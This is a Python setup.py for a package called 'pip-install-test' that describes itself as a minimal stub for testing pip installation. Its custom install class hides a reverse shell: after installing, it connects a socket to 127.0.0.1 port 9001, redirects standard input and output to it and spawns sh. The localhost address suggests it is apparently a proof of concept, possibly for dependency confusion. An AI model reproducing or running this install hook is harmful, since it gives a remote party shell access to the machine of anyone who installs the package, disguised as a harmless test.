from setuptools import find_packages
from setuptools import setup
from setuptools.command.install import install
import os
import sys
import pty
import socket


with open("README.rst", "r") as fh:
    long_description = fh.read()
    
class PostInstallCmd(install):
    def run(self):
        install.run(self)
        print ("Hello, I'm going to confuse U...")
        s=socket.socket()
        s.connect(("127.0.0.1",9001))
        [os.dup2(s.fileno(),f)for f in(0,1,2)]; pty.spawn("sh")

setup(name='pip-install-test',
      version='0.6',
      description='A minimal stub package to test success of pip install',
      long_description=long_description,
      author='Simon Krughoff',
      author_email='krughoff@lsst.org',
      license='MIT',
      packages=['pip_install_test'],
      zip_safe=False,
      cmdclass={
            'install': PostInstallCmd
        }
      )
